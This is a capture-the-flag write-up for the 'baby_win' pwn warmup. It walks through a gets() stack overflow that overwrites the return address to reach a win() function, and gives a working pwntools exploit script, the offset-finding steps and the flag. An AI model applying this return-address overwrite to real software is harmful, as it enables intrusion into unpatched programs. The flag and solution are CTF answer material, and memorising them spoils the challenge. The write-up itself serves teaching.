# baby_win

**Category:** pwn
**Difficulty:** warmup
**Protections:** No canary, No PIE, No NX (stack executable, though unused here)

## Challenge

```
$ nc <host> 5000
=== SecurinetsENIT baby_win ===
Tell me a story:
```

The binary reads a "story" from stdin and echoes it back.

## Vulnerability

`vuln()` reads user input with `gets()` into a 64-byte stack buffer:

```c
void vuln(void) {
    char buf[64];
    ...
    gets(buf);
    ...
}
```

`gets()` has no length limit — it will happily write past the end of `buf`,
overwriting everything above it on the stack, including saved registers and
the **return address**.

There is also an unused function in the binary, never called from `main()`:

```c
void win(void) {
    ...
    fopen("./flag.txt", "r");
    ...
}
```

Since there's no PIE, `win()` sits at a **fixed, known address** in every
run. The goal: overflow `buf` until we overwrite the saved return address
with `win()`'s address, so that when `vuln()` returns, execution jumps
into `win()` instead of back into `main()`.

## Finding the offset

Rather than guessing, use `pwntools`' cyclic pattern:

```python
from pwn import *
io = process('./chall')
io.recvuntil(b'story:')
io.sendline(cyclic(200))
io.wait()
core = io.corefile
print(hex(core.pc))          # crashing return address, made of pattern bytes
```

The crash shows `RIP = 0x6161617461616173`. Feed that back in:

```python
print(cyclic_find(0x6161617461616173, n=8))
# -> 72
```

So **72 bytes** of padding land you exactly at the return address slot.
(64-byte buffer + 8 bytes of saved base pointer `rbp` = 72 — this lines up
with the standard x86-64 stack frame layout you'd see in the disassembly.)

## Finding `win()`'s address

No PIE means addresses are static and visible directly in the binary:

```bash
$ objdump -d chall | grep '<win>:'
0000000000401216 <win>:
```

Or simply:

```python
from pwn import ELF
e = ELF('./chall')
print(hex(e.symbols['win']))   # 0x401216
```

## Exploit

```python
from pwn import *

e = ELF('./chall')
io = process('./chall')      # or: remote('host', 5000)

io.recvuntil(b'story:')
payload = b'A' * 72 + p64(e.symbols['win'])
io.sendline(payload)

print(io.recvall().decode())
```

Running it:

```
You said: AAAA...AAAA\x16\x12@
Thanks, bye!
[+] key accepted. here's your flag:
SecurinetsENIT{b4by_st3ps_1nt0_pwn}
```

## Flag

```
SecurinetsENIT{b4by_st3ps_1nt0_pwn}
```

## Takeaways

- Unbounded input functions (`gets`, unchecked `strcpy`/`sprintf`, etc.)
  are a direct path to stack corruption.
- The saved return address lives right above local buffers on the stack —
  overflow far enough and you control where the function "returns" to.
- Without PIE, function addresses are static and can be read straight out
  of the binary — no leak needed. (This changes drastically once PIE is
  introduced — see later challenges in this track.)
- `cyclic()` / `cyclic_find()` is the standard, reliable way to find
  overflow offsets instead of trial-and-error padding.